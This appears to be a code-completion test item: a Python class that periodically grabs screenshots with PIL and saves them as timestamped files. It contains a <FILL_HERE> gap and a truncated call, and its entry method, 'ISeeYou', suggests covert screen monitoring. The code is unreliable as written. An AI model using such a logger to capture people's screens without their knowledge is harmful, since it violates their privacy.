from PIL import ImageGrab
from threading import Timer
from datetime import datetime



class Screenshot():

    def __init__(self, interval):
        self.interval = interval
        self.time = datetime.now()
    
    def update_filename(self):
        self.filename = datetime.now()

    def program(self):
        self.update_filename()
        snap = ImageGrab.gra # code
        file = f"{self.filename}--snapshot.png"
        snap.save(file)
        timer = Timer(interval=self.interval, function=self.progr<FILL_HERE>
        timer.start()

    def ISeeYou(self):
        self.time = datetime.now()
        self.program()